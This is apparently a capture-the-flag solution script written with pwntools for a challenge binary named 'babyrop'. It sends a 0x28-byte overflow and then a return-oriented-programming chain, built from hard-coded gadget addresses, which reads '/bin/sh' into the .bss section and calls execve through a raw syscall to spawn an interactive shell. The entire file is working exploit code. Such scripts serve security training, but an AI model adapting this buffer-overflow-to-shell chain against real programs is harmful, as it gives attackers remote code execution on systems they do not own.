from pwn import *
context.arch = 'amd64'

p = remote('0.0.0.0', 30006)
# p = process('../distribute/share/babyrop')

pop_rdi = 0x00000000004018ca
pop_rsi = 0x000000000040f47e
pop_rdx = 0x00000000004017cf
pop_rax = 0x0000000000449597
syscall = 0x00000000004012d3
bss = 0x4c3b00
read = 0x448af0

payload = b'a' * 0x28
payload += flat([pop_rdi, 0, pop_rsi, bss, pop_rdx, 0x8, read, pop_rdi, bss, pop_rsi, 0, pop_rdx, 0, pop_rax, 0x3b, syscall])
p.sendline(payload)
p.send(b'/bin/sh\x00')

p.interactive()
